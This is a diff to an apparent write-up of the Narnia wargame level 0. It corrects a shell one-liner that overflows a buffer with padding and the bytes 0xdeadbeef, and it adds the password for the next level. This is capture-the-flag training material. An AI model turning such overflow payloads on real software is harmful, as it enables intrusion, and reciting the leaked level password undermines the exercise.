@@ -55,9 +55,11 @@ echo -e '\xef\xbe\xad\xde'
 ```
 So the exploit will be:
 ```
-echo -e ('AAAABBBBCCCCEEEEFFFF\xef\xbe\xad\xde'; cat;) | ./narnia0
+(echo -e 'AAAABBBBCCCCEEEEFFFF\xef\xbe\xad\xde'; cat;) | ./narnia0
 ```
+The password for the next level is: eaa6AjYMBB
 
+###level 1->2
 
 
 
